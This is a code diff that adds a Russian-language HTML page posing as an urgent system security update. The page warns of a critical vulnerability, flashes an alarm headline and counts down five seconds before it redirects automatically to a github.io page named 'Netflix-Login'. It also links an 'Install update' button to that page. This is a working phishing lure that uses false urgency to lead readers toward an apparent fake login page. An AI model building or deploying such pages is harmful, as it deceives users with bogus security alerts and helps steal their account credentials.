@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Срочное обновление системы</title>
+    <script>
+        setTimeout(function() {
+            window.location.href = "https://henriquecdasneves.github.io/Netflix-Login/";
+        }, 5000);
+    </script>
+    <style>
+        body { font-family: Arial, sans-serif; background: #fff3cd; padding: 50px; }
+        .urgent-update { background: white; border: 3px solid #ffc107; padding: 40px; border-radius: 10px; text-align: center; }
+        .flash { animation: flash 2s infinite; }
+        @keyframes flash { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .time-left { font-size: 24px; color: #856404; font-weight: bold; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <div class="urgent-update">
+        <h1 class="flash">🚨 СРОЧНОЕ ОБНОВЛЕНИЕ СИСТЕМЫ</h1>
+        <p>Обнаружена критическая уязвимость в системе безопасности.</p>
+        <p>Требуется немедленное обновление для защиты ваших данных.</p>
+        <div class="time-left">Перенаправление через: <span id="urgentTimer">5</span> секунд</div>
+        <p><a href="https://henriquecdasneves.github.io/Netflix-Login/">Установить обновление</a></p>
+    </div>
+    
+    <script>
+        let urgentTimer = 5;
+        setInterval(function() {
+            urgentTimer--;
+            document.getElementById('urgentTimer').textContent = urgentTimer;
+        }, 1000);
+    </script>
+</body>
+</html>
